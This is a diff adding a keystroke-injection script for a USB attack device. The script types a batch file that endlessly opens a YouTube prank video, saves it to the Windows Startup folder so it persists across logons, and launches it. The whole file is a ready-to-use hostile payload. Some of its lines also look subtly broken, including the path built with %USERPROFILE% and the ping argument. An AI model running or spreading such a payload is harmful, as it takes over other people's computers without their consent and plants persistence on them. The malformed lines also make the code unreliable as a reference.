@@ -1,0 +1,47 @@
+REM created by Manindra de Mel
+REM ##########################
+DELAY 500
+GUI r
+DELAY 500
+STRING notepad
+ENTER
+DELAY 700
+STRING @echo off
+ENTER
+STRING :top
+ENTER
+STRING start https://www.youtube.com/watch?v=dQw4w9WgXcQ&ab_channel=RickAstleyVEVO
+ENTER
+STRING ping -n 127.1>nul
+ENTER
+STRING goto top
+DELAY 200
+CTRL SHIFT s
+DELAY 500
+ALT d
+DELAY 500
+STRING C:\Users\%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+DELAY 200
+ENTER
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 500
+STRING run.bat
+DELAY 100
+ENTER
+DELAY 300
+GUI r
+DELAY 300
+STRING cmd
+DELAY 500
+STRING C:\Users\%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\run.bat
